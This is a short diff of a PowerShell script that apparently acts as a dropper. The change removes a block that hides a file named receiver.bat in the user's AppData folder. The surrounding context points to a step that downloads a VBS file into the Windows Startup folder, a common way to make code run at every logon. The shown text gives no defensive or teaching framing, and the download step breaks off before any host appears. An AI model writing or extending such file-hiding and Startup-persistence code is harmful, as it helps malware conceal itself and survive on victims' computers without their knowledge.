@@ -20,17 +20,6 @@ try {
 # Define the path to receiver.bat in AppData\Local
 $receiverPath = "$env:APPDATA\receiver.bat"
 
-# Hide the receiver.bat file if it exists
-try {
-    if (Test-Path $receiverPath) {
-        Set-ItemProperty -Path $receiverPath -Name Attributes -Value ([System.IO.FileAttributes]::Hidden)
-        Write-Host "Receiver.bat file hidden."
-    } else {
-        Write-Host "Receiver.bat file not found."
-    }
-} catch {
-    Write-Host "Failed to hide receiver.bat: $_"
-}
 
 # Download the VBS file to the Startup folder
 try {
